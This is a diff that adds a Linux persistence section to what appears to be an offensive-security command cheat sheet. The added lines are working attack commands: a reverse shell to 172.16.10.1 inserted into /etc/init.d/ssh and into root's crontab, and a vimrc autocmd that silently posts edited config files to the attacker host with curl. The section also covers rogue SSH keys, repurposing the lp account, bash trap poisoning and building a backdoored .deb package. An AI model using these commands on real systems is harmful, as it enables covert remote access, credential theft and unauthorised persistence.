@@ -343,3 +343,75 @@ unix-privesc-check standard
 unix-privesc-check detailed
 
 
+# Persistence
+
+ncat 172.16.10.1 4444 -e /bin/bash 2> /dev/null &  this is added to /etc/init.d/ssh file as malicious code
+pwncat-cs -l -p 4444
+service ssh start
+
+ls -l /etc/pam.d
+tail -n 20 /etc/pam.d/common-session
+
+# Rogue SSH Keys
+
+ssh-keygen -t rsa -C ""
+ssh backup@172.16.10.13 -i ~/.ssh/id_rsa
+
+# Repurposing Default System Accounts
+
+grep lp /etc/passwd
+usermod -s /bin/bash lp
+passwd lp
+
+# Bash Env Poisoning
+
+cat /etc/bash.bashrc
+cat /etc/profile
+
+touch .profile
+source .profile
+use of 'trap' built-in mechanism to run malicious bash right before command execution
+
+# Credential Theft / VIM
+
+cat ~/.vimrc
+
+autocmd BufWritePost *.conf,*.config :silent !timeout 3 curl -m 5 -s http://172.16.10.1:8080 -o /dev/null --data-binary @<afile> &
+echo 'autocmd BufWritePost *.conf,*.config :silent !timeout 3 curl -m 5 -s http://172.16.10.1:8080 -o /dev/null --data-binary @<afile> &' > .vimrc
+
+nc -lkvp 8080
+
+# Streaming Executed Commands
+
+touch /etc/profile.d/99-stream.sh
+socat TCP4-LISTEN:4444,fork STDOUT
+python -m http.server 8080
+
+# Distributing Malicious Package
+
+dpkg --info example_amd64.deb
+strings example_amd64.deb
+sudo dpkg -i example_amd64.deb
+ar -v -x example_amd64.deb
+
+tar -xvf control.tar.xz
+tar -xvf data.tar.xz
+
+dpkg -b example-deb example_deb_x64.deb
+stat example_deb_x64.deb
+dpkg --info example_deb_x64.deb
+sudo dpkg -i example_deb_x64.deb
+sudo dpkg -r example-deb
+
+sudo alien -v -r example_deb_x64.deb --scripts
+
+dpkg -b bksh bksh_x64.deb
+sudo dpkg -i bksh_x64.deb
+sudo dpkg -r bksh
+
+sudo cat /var/spool/cron/crontabs/root
+echo "* * * * * root nc 172.16.10.1 4444 -e /bin/bash" | crontab - -u root
+cat /etc/crontab
+
+sudo crontab -u root -l
+crontab -u backup -l
